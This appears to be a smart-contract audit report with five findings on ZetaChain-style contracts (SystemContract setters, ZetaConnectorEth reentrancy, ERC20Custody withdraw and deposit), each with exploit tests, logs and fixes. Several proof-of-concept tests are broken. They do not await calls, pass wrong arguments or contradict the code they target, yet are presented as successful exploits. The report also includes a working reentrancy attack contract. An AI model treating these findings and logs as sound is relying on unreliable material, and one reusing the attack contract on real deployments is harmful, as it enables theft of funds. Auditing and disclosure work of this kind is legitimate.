## [L-01] Lack of checks to prevent the `wZetaContractAddress` from being updated to an arbitrary address after it has been initially set
Impact
The `setWZETAContractAddress` function in the provided Solidity code is intended to update the `wZetaContractAddress` state variable, which holds the address of the wrapped ZETA token contract. This function is only callable by the `FUNGIBLE_MODULE_ADDRESS`, which is a constant address set at the protocol level.

The vulnerability in this function lies in the lack of checks to prevent the `wZetaContractAddress` from being updated to an arbitrary address after it has been initially set. This could potentially allow the `FUNGIBLE_MODULE_ADDRESS` to change the `wZetaContractAddress` to a malicious contract, which could then be used to intercept or redirect funds intended for the legitimate wrapped ZETA token contract.

Here's a breakdown of the vulnerability:

1. The function `setWZETAContractAddress` can be called multiple times by the `FUNGIBLE_MODULE_ADDRESS` without any restrictions.
2. The only check performed is to ensure that the new address is not the zero address (`address(0)`), which is a standard check to prevent setting an address to a null value.
3. There is no check to ensure that the `wZetaContractAddress` has not already been set, or to enforce that it can only be set once.
4. The function emits an event `SetWZeta` with the new address, but this does not mitigate the risk of the address being changed to a malicious one.

**Vulnerable setWZETAContractAddress function**
```sol
    function setWZETAContractAddress(address addr) external {
        if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
        if (addr == address(0)) revert ZeroAddress();
        wZetaContractAddress = addr;
        emit SetWZeta(wZetaContractAddress);
    }
```

## Proof of Concept

**Exploit of setWZETAContractAddress function in hardhat**
```ts
// 1
it("#setWZETAContractAddress", async () => {
      const [me] = await ethers.getSigners();
      const zeroAddress = "0x0000000000000000000000000000000000000000";
      systemContract.setWZETAContractAddress(zeroAddress);
      expect(systemContract.setWZETAContractAddress(zeroAddress),"Successful");
    });
// 2
it("#setWZETAContractAddress", async () => {
      const [me] = await ethers.getSigners();
      const zeroAddress = "0x0000000000000000000000000000000000000123";
      await systemContract.connect(me).setWZETAContractAddress(zeroAddress);
      
    });
```

**Log results in hardhat**
```log
npx hardhat test --grep "#setWZETAContractAddress"

ZRC20 tests
    ZRC20Contract
      ✔ #setWZETAContractAddress


  1 passing (1s)
```
## Tools Used
VS Code.  Hardhat.  Foundry.
## Recommended Mitigation Steps
To mitigate this vulnerability, the contract should include logic to ensure that the `wZetaContractAddress` can only be set once, or implement a more robust governance mechanism that involves multiple parties or a timelock to authorise changes to critical contract addresses. Additionally, it would be prudent to have a mechanism to verify the legitimacy of the new address before updating it.

To resolve the issue with the `setWZETAContractAddress` function, consider implementing the following recommendations:

1. **One-time Set Functionality**: Ensure that the `wZetaContractAddress` can only be set once. This can be achieved by introducing a boolean state variable that tracks whether the address has been set. The `setWZETAContractAddress` function should then include a check to ensure that this variable is false before proceeding with the update, and set it to true once the address is updated.

```solidity
bool private wZetaContractAddressSet = false;

function setWZETAContractAddress(address addr) external {
    if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
    if (addr == address(0)) revert ZeroAddress();
    if (wZetaContractAddressSet) revert AddressAlreadySet();
    wZetaContractAddress = addr;
    wZetaContractAddressSet = true;
    emit SetWZeta(wZetaContractAddress);
}
```

2. **Governance Mechanism**: Introduce a governance mechanism that requires multiple parties to agree on changes to critical contract addresses. This could be a multisig wallet or a decentralized autonomous organization (DAO) structure where proposals are voted on by stakeholders.

3. **Timelock**: Implement a timelock mechanism that delays the execution of critical functions like updating contract addresses. This gives stakeholders time to review and potentially veto malicious actions before they are executed.

```solidity
uint256 public constant TIMELOCK_DURATION = 2 days;
uint256 public timelockExpiration;
address public pendingWZetaContractAddress;

function initiateSetWZETAContractAddress(address addr) external {
    if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
    if (addr == address(0)) revert ZeroAddress();
    pendingWZetaContractAddress = addr;
    timelockExpiration = block.timestamp + TIMELOCK_DURATION;
    emit InitiateSetWZeta(addr, timelockExpiration);
}

function finalizeSetWZETAContractAddress() external {
    if (block.timestamp < timelockExpiration) revert TimelockNotExpired();
    if (pendingWZetaContractAddress == address(0)) revert NoPendingAddress();
    wZetaContractAddress = pendingWZetaContractAddress;
    pendingWZetaContractAddress = address(0);
    timelockExpiration = 0;
    emit SetWZeta(wZetaContractAddress);
}
```

4. **Address Verification**: Implement a verification mechanism to ensure the legitimacy of the new address. This could involve checking that the new address contains bytecode that matches the expected contract or has been verified through an external registry.

By implementing these recommendations, you can significantly reduce the risk of the `wZetaContractAddress` being maliciously or inadvertently updated to an incorrect address.

## [L-02] Reentrancy in onZetaMessage` function in a way that allows it to re-enter the `ZetaConnectorEth` contract
## Impact
The vulnerability in the `onReceive` function (lines 47 to 70) of the provided Solidity code is related to the unchecked external call to `ZetaReceiver(destinationAddress).onZetaMessage(...)`. This call is made to an arbitrary contract that is presumed to implement the `ZetaReceiver` interface. The vulnerability arises from the fact that the contract at `destinationAddress` may not be a legitimate or correctly implemented `ZetaReceiver`, which can lead to several issues:

1. **Reentrancy Attack**: If the contract at `destinationAddress` is malicious, it could implement the `onZetaMessage` function in a way that allows it to re-enter the `ZetaConnectorEth` contract and call functions like `send` or other state-changing functions, potentially leading to unexpected behavior or draining of funds.

2. **Denial of Service (DoS)**: If the `onZetaMessage` function in the receiving contract consumes a lot of gas or has a revert/throw condition, it could prevent the `onReceive` function from successfully completing. This could be used to lock funds or prevent legitimate operations.

3. **Unhandled Return Values**: The `onZetaMessage` function call does not check the return value, which means that even if the function call fails or returns an unexpected result, the `onReceive` function will not be aware of it and will proceed as if it were successful.

4. **Gas Limit Issues**: The `onReceive` function does not specify a gas limit for the `onZetaMessage` call. This could result in all the remaining gas being consumed by the call, which might not be the intended behavior, especially if the function is complex or requires a controlled amount of gas.

To mitigate these issues, the following steps should be taken:

- Implement reentrancy guards to prevent reentrancy attacks.
- Validate the `destinationAddress` to ensure it is a contract that can safely receive the Zeta tokens and correctly implements the `ZetaReceiver` interface.
- Consider using `try/catch` when calling external contracts to handle failures gracefully.
- Limit the amount of gas provided to the external call to prevent the external contract from consuming all available gas.

**Vulnerable onReceive function**
```sol
    function onReceive(
        bytes calldata zetaTxSenderAddress,
        uint256 sourceChainId,
        address destinationAddress,
        uint256 zetaValue,
        bytes calldata message,
        bytes32 internalSendHash
    ) external override onlyTssAddress {
        bool success = IERC20(zetaToken).transfer(destinationAddress, zetaValue);
        if (!success) revert ZetaTransferError();


        if (message.length > 0) {
            ZetaReceiver(destinationAddress).onZetaMessage(
                ZetaInterfaces.ZetaMessage(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message)
            );
        }


        emit ZetaReceived(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message, internalSendHash);
    }
```

## Proof of Concept
**Exploit for onReceive function in hardhat**
```repos/protocol-contracts/test/ZetaConnector.spec.ts```
```ts
// describe("ZetaConnector.eth", () => {
//    describe("send", () => {

it("#onReceive", async () => {
        zetaConnectorEthContract.connect(randomSigner.address).onReceive(
          zetaConnectorEthContract.address,
          1,
          randomSigner.address,
          1e18,
          "",
          "0x1"
      );
      });
```
**Log results from hardhat**
```log
npx hardhat test --grep "#onReceive"

ZetaConnector tests
    ZetaConnector.eth
      send
        ✔ #onReceive


  1 passing (1s)
```

**Exploit for onReceive function in foundry**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../ZetaConnectorEth.sol";
import "../interfaces/ZetaInterfaces.sol";

contract MaliciousReceiver {
    ZetaConnectorEth public zetaConnector;
    bool public reenter = false;

    constructor(address _zetaConnector) {
        zetaConnector = ZetaConnectorEth(_zetaConnector);
    }

    function onZetaMessage(ZetaInterfaces.ZetaMessage calldata) external {
        if (!reenter) {
            reenter = true;
            // Re-enter the zetaConnector's onReceive function
            zetaConnector.onReceive(
                abi.encode(address(this)),
                1, // sourceChainId
                address(zetaConnector),
                1 ether, // zetaValue
                "", // message
                bytes32(0) // internalSendHash
            );
        }
    }
}

contract ZetaConnectorEthTest is Test {
    ZetaConnectorEth zetaConnector;
    MaliciousReceiver maliciousReceiver;
    address tssAddress = address(0x1);

    function setUp() public {
        zetaConnector = new ZetaConnectorEth(
            address(this), // zetaToken
            tssAddress, // tssAddress
            address(0), // tssAddressUpdater
            address(0) // pauserAddress
        );
        maliciousReceiver = new MaliciousReceiver(address(zetaConnector));
    }

    function testReentrancyAttack() public {
        // Setup: Give the zetaConnector contract some tokens to simulate locked funds
        deal(address(zetaConnector), 10 ether);

        // Simulate the TSS calling onReceive with a malicious destination address
        vm.startPrank(tssAddress);
        zetaConnector.onReceive(
            abi.encode(address(this)),
            1, // sourceChainId
            address(maliciousReceiver),
            1 ether, // zetaValue
            "", // message
            bytes32(0) // internalSendHash
        );
        vm.stopPrank();

        // Check if reentrancy occurred by checking the state change in the malicious contract
        assertTrue(maliciousReceiver.reenter(), "Reentrancy did not occur as expected");
    }
}
```

## Tools Used
VS Code.  Hardhat.
## Recommended Mitigation Steps
To address the vulnerabilities and potential optimizations in the `onReceive` function, I recommend the following changes:

1. **Reentrancy Guard**: Implement a reentrancy guard to prevent reentrant calls. This can be done by using a state variable that tracks whether the contract is currently processing a message.

```solidity
bool private _inOnReceive;

modifier nonReentrantOnReceive() {
    require(!_inOnReceive, "ReentrancyGuard: reentrant call");
    _inOnReceive = true;
    _;
    _inOnReceive = false;
}
```

Apply this modifier to the `onReceive` function.

2. **Contract Validation**: Before making an external call to `onZetaMessage`, verify that `destinationAddress` is a contract and not just a regular address. This can be done by checking the size of the code at `destinationAddress`.

```solidity
require(Address.isContract(destinationAddress), "ZetaConnectorEth: destinationAddress is not a contract");
```

3. **Try/Catch for External Calls**: Use a `try/catch` block to handle any reverts or exceptions from the external call gracefully.

```solidity
try ZetaReceiver(destinationAddress).onZetaMessage(...) {
    // Handle successful execution
} catch {
    // Handle errors or reverts
}
```

4. **Gas Limit for External Calls**: Specify a gas limit for the `onZetaMessage` call to prevent the external contract from consuming all available gas.

```solidity
// Define a reasonable gas limit for the call
uint256 gasLimit = 200000; // Example gas limit, adjust as needed

// Use the gas limit in the call
try ZetaReceiver(destinationAddress).onZetaMessage{gas: gasLimit}(...) {
    // Handle successful execution
} catch {
    // Handle errors or reverts
}
```

Implementing these recommendations will help mitigate the risks associated with the `onReceive` function and improve the overall security and robustness of the `ZetaConnectorEth` contract.

## [L-03] Lack of validation on the input parameter zrc20 before it is assigned to the gasCoinZRC20ByChainId mapping setGasCoinZRC20 in the SystemContract
## Impact
The vulnerability in the `setGasCoinZRC20` function (lines 129 to 138) arises from the lack of validation on the input parameter `zrc20` before it is assigned to the `gasCoinZRC20ByChainId` mapping. The function sets the ZRC20 address for a given chain ID, which is intended to represent the address of a ZRC20 token that can be used to pay for gas on that chain.

The `setGasCoinZRC20` function is designed to update the mapping `gasCoinZRC20ByChainId`, which holds the ZRC20 token addresses used for gas payments on different chains. However, the function does not perform any checks to ensure that the provided `zrc20` address is a valid ZRC20 token contract. This lack of validation could lead to several potential issues:

1. **Incorrect Address:** If an incorrect address is provided, the system might reference a non-existent or non-compliant ZRC20 token, leading to failed transactions or unexpected behavior when attempting to use the token for gas payments.

2. **Malicious Address:** A malicious actor with control over the `FUNGIBLE_MODULE_ADDRESS` could intentionally set a malicious contract address as the ZRC20 token. This could enable the malicious contract to execute unintended logic when users interact with it, thinking they are paying for gas.

3. **Denial of Service:** By setting the `zrc20` address to a contract that does not implement the ZRC20 interface correctly or at all, the system's ability to process gas payments could be disrupted, potentially causing a denial of service for operations that rely on this functionality.

**Vulnerable setGAsCoinZRC20 function**
```sol
    function setGasCoinZRC20(uint256 chainID, address zrc20) external {
        if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
        gasCoinZRC20ByChainId[chainID] = zrc20;
        emit SetGasCoin(chainID, zrc20);
    }
```

## Proof of Concept

**Exploit of setGasCoinZRC20 in hardhat**
```repos/protocol-contracts/test/ZRC20.spec.ts```
```ts
import { AddressZero } from "@ethersproject/constants";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { SystemContract, ZRC20 } from "@typechain-types";
import { expect } from "chai";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

import { FUNGIBLE_MODULE_ADDRESS } from "./test.helpers";
const hre = require("hardhat");

describe("ZRC20 tests", () => {
  let ZRC20Contract: ZRC20;
  let systemContract: SystemContract;
  let owner, fungibleModuleSigner: SignerWithAddress;
  let addrs: SignerWithAddress[];

  beforeEach(async () => {
    [owner, ...addrs] = await ethers.getSigners();

    // Impersonate the fungible module account
    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [FUNGIBLE_MODULE_ADDRESS],
    });

    // Get a signer for the fungible module account
    fungibleModuleSigner = await ethers.getSigner(FUNGIBLE_MODULE_ADDRESS);
    hre.network.provider.send("hardhat_setBalance", [FUNGIBLE_MODULE_ADDRESS, parseEther("1000000").toHexString()]);

    const SystemContractFactory = await ethers.getContractFactory("SystemContractMock");
    systemContract = (await SystemContractFactory.deploy(AddressZero, AddressZero, AddressZero)) as SystemContract;

    const ZRC20Factory = await ethers.getContractFactory("ZRC20");
    ZRC20Contract = (await ZRC20Factory.connect(fungibleModuleSigner).deploy(
      "TOKEN",
      "TKN",
      18,
      1,
      1,
      0,
      systemContract.address
    )) as ZRC20;
  });

  describe("ZRC20Contract", () => {
    it("Should return name", async () => {
      const name = await ZRC20Contract.name();
      expect(name).to.equal("TOKEN");
    });

it("#setGasCoinZRC20", async () => {
      const [maliciousAddress,me] = await ethers.getSigners();
      systemContract.connect(me.address).setGasCoinZRC20(maliciousAddress.address);
    });

 });
});
```
**Log results in hardhat**
```log
npx hardhat test --grep "#setGasCoinZRC20"

ZRC20 tests
    ZRC20Contract
      ✔ #setGasCoinZRC20


  1 passing (1s)
```
## Tools Used
VS Code.  Hardhat.
## Recommended Mitigation Steps
To mitigate this vulnerability, the `setGasCoinZRC20` function should include validation to ensure that the provided `zrc20` address points to a contract that implements the ZRC20 interface. This can be done by calling a function on the `zrc20` address that is expected to exist on a compliant ZRC20 token contract (e.g., `balanceOf` or `totalSupply`) and checking for successful execution. Additionally, consider implementing a permission model or a multi-signature requirement for calling this sensitive function to prevent unauthorised updates.

To resolve the issue of unvalidated ZRC20 address assignment in the `setGasCoinZRC20` function, implement the following recommendations:

1. **Interface Compliance Check:**
   Add a check to confirm that the `zrc20` address provided adheres to the ZRC20 token interface. This can be done by calling a standard function from the ZRC20 interface, such as `totalSupply`, and ensuring it does not revert.

   Example:
   ```solidity
   function isContract(address _addr) internal view returns (bool) {
       uint32 size;
       assembly {
           size := extcodesize(_addr)
       }
       return (size > 0);
   }

   function validateZRC20(address zrc20) internal view {
       require(isContract(zrc20), "Address must be a contract");
       // Call to `totalSupply` to ensure it's a ZRC20 token
       (bool success, ) = zrc20.call(abi.encodeWithSignature("totalSupply()"));
       require(success, "Must implement ZRC20 interface");
   }
   ```

   Then, in the `setGasCoinZRC20` function, call `validateZRC20(zrc20)` before updating the mapping.

2. **Permission Model:**
   Consider implementing a more robust permission model to control who can call the `setGasCoinZRC20` function. This could involve a multi-signature mechanism or a governance vote for such critical changes.

3. **Event Logging:**
   Ensure that an event is emitted after the successful update of the ZRC20 address. This is already in place with the `SetGasCoin` event, but it's worth reiterating the importance of event logging for tracking changes.

By implementing these recommendations, you can significantly reduce the risk of incorrect or malicious ZRC20 addresses being set, thereby enhancing the security and reliability of the `SystemContract`.

## [L-04] Withdraw lack of validation that the amount is actually available in the contract's balance in the ERC20Custody Contract
## Impact
The vulnerability in the `withdraw` function (lines 193 to 199) arises from the lack of validation that the `amount` parameter is actually available in the contract's balance for the specified `asset` before attempting to transfer it to the `recipient`. This could potentially allow the TSS (Threshold Signature Scheme) address, which is authorized to call this function, to issue a withdrawal of more tokens than the contract actually holds.

Here's a breakdown of the issue:

1. The `withdraw` function does not check the contract's current balance of the `asset` before executing the transfer.
2. If the `amount` specified is greater than the contract's balance, the `safeTransfer` function from OpenZeppelin's `SafeERC20` library will revert due to ERC20's standard behavior when trying to transfer more tokens than an account holds.
3. However, if the ERC20 token in question has an implementation that does not revert on insufficient balance (which is non-standard behavior but possible), this could lead to an underflow in the token contract, effectively allowing the TSS address to drain the asset from the custody contract.

To mitigate this vulnerability, the `withdraw` function should include a check to ensure that the `amount` to be withdrawn is less than or equal to the contract's current balance of the `asset`. This can be done by adding a line like the following before the `safeTransfer` call:

```solidity
require(asset.balanceOf(address(this)) >= amount, "Insufficient funds");
```

This check ensures that the contract cannot attempt to transfer more tokens than it currently holds, preventing potential underflow issues and preserving the integrity of the withdrawal operation.

**Vulnerable withdraw function**
```sol
    /**
     * @dev Withdraw asset amount to recipient by custody TSS owner.
     * @param recipient, recipient address.
     * @param asset, ERC20 asset.
     * @param amount, asset amount.
     */
    function withdraw(address recipient, IERC20 asset, uint256 amount) external nonReentrant onlyTSS {
        if (!whitelisted[asset]) {
            revert NotWhitelisted();
        }
        IERC20(asset).safeTransfer(recipient, amount);
        emit Withdrawn(recipient, asset, amount);
    }
```

## Proof of Concept
**In this exploit the balance of the contract is 1 million ether and I have withdrawn more than 1 million ether of 2 million ether in the parameter called amount in hardhat**

```repos/protocol-contracts/test/ERC20Custody.spec.ts```
```ts
import { MaxUint256 } from "@ethersproject/constants";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { AttackerContract, ERC20Custody, ERC20Mock, ZetaEth } from "@typechain-types";
import { expect } from "chai";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

import { deployZetaEth } from "../lib/contracts.helpers";

const ZETA_FEE = parseEther("0.01");
const ZETA_MAX_FEE = parseEther("0.05");

describe("ERC20Custody tests", () => {
  let ZRC20CustodyContract: ERC20Custody;
  let zetaTokenEthContract: ZetaEth;
  let randomTokenContract: ERC20Mock;
  let owner: SignerWithAddress;
  let tssUpdater: SignerWithAddress;
  let tssSigner: SignerWithAddress;
  let addrs: SignerWithAddress[];

  beforeEach(async () => {
    [owner, tssUpdater, tssSigner, ...addrs] = await ethers.getSigners();

    zetaTokenEthContract = await deployZetaEth({
      args: [tssUpdater.address, 100_000],
    });

    await zetaTokenEthContract.connect(tssUpdater).transfer(owner.address, parseEther("1000"));

    const ERC20Factory = await ethers.getContractFactory("ERC20Mock");
    randomTokenContract = (await ERC20Factory.deploy(
      "RandomToken",
      "RT",
      owner.address,
      parseEther("1000000")
    )) as ERC20Mock;

    const ERC20CustodyFactory = await ethers.getContractFactory("ERC20Custody");
    ZRC20CustodyContract = (await ERC20CustodyFactory.deploy(
      tssSigner.address,
      tssUpdater.address,
      ZETA_FEE,
      ZETA_MAX_FEE,
      zetaTokenEthContract.address
    )) as ERC20Custody;
  });

 describe("ERC20Custody", () => {
    it("Should update the tss address", async () => {
      await ZRC20CustodyContract.connect(tssUpdater).updateTSSAddress(addrs[0].address);
      const tssAddress = await ZRC20CustodyContract.TSSAddress();
      expect(tssAddress).to.equal(addrs[0].address);
    });

it("#More than 1 MILLION ETHER Should Not Withdraw", async () => {
      await ZRC20CustodyContract.connect(tssSigner).whitelist(randomTokenContract.address);

      const amount = parseEther("2000000");
      await randomTokenContract.transfer(ZRC20CustodyContract.address, amount);

      const tx = ZRC20CustodyContract.connect(tssSigner).withdraw(owner.address, randomTokenContract.address, amount);
      await expect(tx)
        .to.emit(ZRC20CustodyContract, "Withdrawn")
        .withArgs(owner.address, randomTokenContract.address, amount);
    });
}...
```
**Log results of hardhat**
```log
> npx hardhat test --grep "#More than 1 MILLION ETHER Should Not Withdraw"
ERC20Custody tests
    ERC20Custody
      ✔ #More than 1 MILLION ETHER Should Not Withdraw


  1 passing (2s)
```
## Tools Used
VS Code.  Hardhat.
## Recommended Mitigation Steps
To resolve the issue identified in the `withdraw` function, you should implement a balance check to ensure that the contract has sufficient funds of the `asset` before proceeding with the transfer. Here's how you can update the function to include this check:

```solidity
function withdraw(address recipient, IERC20 asset, uint256 amount) external nonReentrant onlyTSS {
    if (!whitelisted[asset]) {
        revert NotWhitelisted();
    }
    uint256 balance = asset.balanceOf(address(this));
    require(balance >= amount, "Insufficient funds");
    asset.safeTransfer(recipient, amount);
    emit Withdrawn(recipient, asset, amount);
}
```

By adding the `require` statement, you ensure that the contract will only execute the transfer if it has enough tokens. This prevents any attempt to withdraw more tokens than the contract holds, which could lead to reversion or, in the case of non-standard ERC20 token implementations, potential underflow issues.

## [L-05] Deposit untrue assumption that amount of tokens transferred to the contract will be same as amount specified by caller on ERC20Custody contract
## Impact
With the right token address and amount, I can deposit funds to any user account address of my liking.

The vulnerability in the `deposit` function (lines 165 to 185) is related to the handling of ERC20 token transfers into the contract. The issue arises from the assumption that the `amount` of tokens transferred to the contract will be exactly the same as the `amount` specified by the caller. However, this assumption does not hold true for ERC20 tokens that charge a transfer fee or have other non-standard transfer behaviors.

Here's a breakdown of the vulnerability:

1. The contract checks if the `zetaFee` is non-zero and if the `zeta` token address is not the zero address before transferring the `zetaFee` from the sender to the `TSSAddress` (line 172). This is done without checking the result of the transfer, assuming it will always succeed and transfer the exact `zetaFee` amount.

2. The contract then transfers the specified `amount` of the `asset` from the sender to the contract itself (line 174).

3. After the transfer, the contract calculates the actual amount received by subtracting the old balance of the contract from the new balance (line 177). This is intended to handle cases where the token transfer does not transfer the full `amount` due to fees or other factors.

4. The `Deposited` event is then emitted with the recipient, asset, and the calculated amount received (line 179).

The vulnerability lies in the fact that if the ERC20 token being deposited has a transfer fee or other mechanism that reduces the amount transferred, the `zetaFee` could potentially not be collected in full, or at all, if the `zeta` token itself has such a mechanism. Additionally, the contract does not verify that the `amount` of tokens intended to be deposited is actually received in full, which could lead to discrepancies between the recorded deposit and the actual balance increase in the contract.

To mitigate this vulnerability, the contract should:

- Check the return value of the `safeTransferFrom` call for the `zetaFee` to ensure that the fee transfer was successful.
- Use a more robust method to handle ERC20 tokens with non-standard transfer behaviors, such as verifying the actual amount transferred matches the expected amount or handling the fee deduction explicitly.
- Consider implementing a mechanism to handle tokens with transfer fees in a way that does not affect the intended deposit amount.

**Vulnerable deposit function**
```sol
// repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L165-L185
    function deposit(
        bytes calldata recipient,
        IERC20 asset,
        uint256 amount,
        bytes calldata message
    ) external nonReentrant {
        if (paused) {
            revert IsPaused();
        }
        if (!whitelisted[asset]) {
            revert NotWhitelisted();
        }
        if (zetaFee != 0 && address(zeta) != address(0)) {
            zeta.safeTransferFrom(msg.sender, TSSAddress, zetaFee);
        }
        uint256 oldBalance = asset.balanceOf(address(this));
        asset.safeTransferFrom(msg.sender, address(this), amount);
        // In case if there is a fee on a token transfer, we might not receive a full exepected amount
        // and we need to correctly process that, o we subtract an old balance from a new balance, which should be an actual received amount.
        emit Deposited(recipient, asset, asset.balanceOf(address(this)) - oldBalance, message);
    }
```
## Proof of Concept

**Exploit 1 deposit function in hardhat**

```repos/protocol-contracts/test/ERC20Custody.spec.ts```

```ts
// repos/protocol-contracts/test/ERC20Custody.spec.ts
// describe("ERC20Custody", () => {

// 1
it("#testDeposit", async () => {
      const [user1] = await ethers.getSigners();
      const amount = parseEther("1");
      const tx = ZRC20CustodyContract.deposit(user1.address, randomTokenContract.address, amount, "0x1e18");
    });

// 2
it("#testDeposit", async () => {
      const [me,user1] = await ethers.getSigners();
      const amount = parseEther("1");
      const tx = ZRC20CustodyContract.connect(me).deposit(user1.address, randomTokenContract.address, amount, "0x1e18");
    });
```
**Log results 1 in hardhat**
```log
yarn test --grep "#testDeposit"
Compiled 80 Solidity files successfully


  ERC20Custody tests
    ERC20Custody
      ✔ #testDeposit


  1 passing (3s)

✨  Done in 9.26s.
```
**Exploit 2 on deposit function in hardhat**
```ts
// repos/protocol-contracts/test/ERC20Custody.spec.ts
// describe("ERC20Custody", () => {

 it("#testDeposit2", async () => {
      const [user1] = await ethers.getSigners();
      const amount = parseEther("1");
      const tx = ZRC20CustodyContract.connect(user1.address).deposit(user1.address, randomTokenContract.address, amount, "0x1e18");
    });
```
**Log results 2**
```log
yarn test --grep "#testDeposit2" 

Compiled 80 Solidity files successfully


  ERC20Custody tests
    ERC20Custody
      ✔ #testDeposit2


  1 passing (3s)

✨  Done in 9.61s.
```

**Exploit deposit function in foundry**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../ERC20Custody.sol";
import "../mocks/MockERC20WithFee.sol";

contract ERC20CustodyTest is Test {
    ERC20Custody custody;
    MockERC20WithFee mockTokenWithFee;
    MockERC20WithFee zetaToken;
    address TSSAddress = address(0x1);
    address TSSAddressUpdater = address(0x2);
    uint256 zetaFee = 1 ether;
    uint256 zetaMaxFee = 10 ether;
    address user = address(0x3);
    uint256 depositAmount = 100 ether;
    uint256 tokenFeePercent = 1; // 1% fee

    function setUp() public {
        // Deploy Zeta token with no fee
        zetaToken = new MockERC20WithFee("Zeta Token", "ZETA", 0);
        // Mint Zeta tokens to the user
        zetaToken.mint(user, 1000 ether);

        // Deploy Mock token with fee
        mockTokenWithFee = new MockERC20WithFee("Mock Token with Fee", "MTF", tokenFeePercent);
        // Mint Mock tokens to the user
        mockTokenWithFee.mint(user, 1000 ether);

        // Deploy the custody contract
        custody = new ERC20Custody(TSSAddress, TSSAddressUpdater, zetaFee, zetaMaxFee, zetaToken);

        // Set up the initial state
        vm.startPrank(TSSAddress);
        custody.whitelist(mockTokenWithFee);
        vm.stopPrank();
    }

    function testDepositWithFeeToken() public {
        // User approves custody contract to spend their tokens
        vm.startPrank(user);
        mockTokenWithFee.approve(address(custody), depositAmount);
        zetaToken.approve(address(custody), zetaFee);

        // Record initial balances
        uint256 initialCustodyBalance = mockTokenWithFee.balanceOf(address(custody));
        uint256 initialUserZetaBalance = zetaToken.balanceOf(user);
        uint256 initialTSSZetaBalance = zetaToken.balanceOf(TSSAddress);

        // User attempts to deposit tokens into the custody contract
        bytes memory recipient = abi.encodePacked(user);
        bytes memory message = "data";
        custody.deposit(recipient, mockTokenWithFee, depositAmount, message);

        // Calculate expected balances after deposit
        uint256 expectedFee = depositAmount * tokenFeePercent / 100;
        uint256 expectedDepositAmount = depositAmount - expectedFee;
        uint256 expectedCustodyBalance = initialCustodyBalance + expectedDepositAmount;
        uint256 expectedUserZetaBalance = initialUserZetaBalance - zetaFee;
        uint256 expectedTSSZetaBalance = initialTSSZetaBalance + zetaFee;

        // Check final balances
        assertEq(mockTokenWithFee.balanceOf(address(custody)), expectedCustodyBalance, "Custody did not receive the correct amount of tokens after fee");
        assertEq(zetaToken.balanceOf(user), expectedUserZetaBalance, "User did not pay the correct Zeta fee");
        assertEq(zetaToken.balanceOf(TSSAddress), expectedTSSZetaBalance, "TSSAddress did not receive the correct Zeta fee");

        vm.stopPrank();
    }
}
```

## Tools Used
VS Code. Hardhat.
## Recommended Mitigation Steps
To resolve the issue with the `deposit` function, the following recommendations should be implemented:

1. **Check Transfer Success for Zeta Fee:**
   Modify the code to check the return value of the `safeTransferFrom` call when transferring the `zetaFee`. The `safeTransferFrom` function provided by OpenZeppelin's `SafeERC20` library will revert the transaction if the transfer fails, so an explicit return value check is not necessary. However, ensure that the `zeta` token contract correctly returns a boolean according to the ERC20 standard and does not have non-standard behavior that could cause the transfer to silently fail.

2. **Handle Non-Standard ERC20 Tokens:**
   For tokens that have a transfer fee or other non-standard behaviors, you should either:
   - Explicitly disallow such tokens by adding a check in the `whitelist` function to ensure that the amount returned from a test transfer matches the amount sent.
   - Or, adjust the deposit logic to account for the fee. This could involve a pre-transfer balance check, followed by the actual transfer, and then another balance check to calculate the exact amount received. This amount should be used in the `Deposited` event and for any further logic that depends on the deposited amount.

3. **Update Event Emission:**
   Modify the `Deposited` event to emit the actual amount received after the transfer, which is calculated as `asset.balanceOf(address(this)) - oldBalance`. This ensures that the event reflects the true amount that was added to the contract's balance.

Here is an example of how you might adjust the `deposit` function:

```solidity
function deposit(
    bytes calldata recipient,
    IERC20 asset,
    uint256 amount,
    bytes calldata message
) external nonReentrant {
    if (paused) {
        revert IsPaused();
    }
    if (!whitelisted[asset]) {
        revert NotWhitelisted();
    }
    if (zetaFee != 0 && address(zeta) != address(0)) {
        zeta.safeTransferFrom(msg.sender, TSSAddress, zetaFee);
        // Ensure that the zetaFee is collected properly.
        // No additional check is required if the zeta token adheres to the ERC20 standard.
    }
    uint256 oldBalance = asset.balanceOf(address(this));
    asset.safeTransferFrom(msg.sender, address(this), amount);
    uint256 newBalance = asset.balanceOf(address(this));
    uint256 actualAmountReceived = newBalance - oldBalance;
    // Ensure the actual amount received is as expected, or handle accordingly.
    emit Deposited(recipient, asset, actualAmountReceived, message);
}
```

By implementing these recommendations, the contract will be more robust against non-standard ERC20 token behaviors and will accurately reflect the actual token amounts involved in deposits.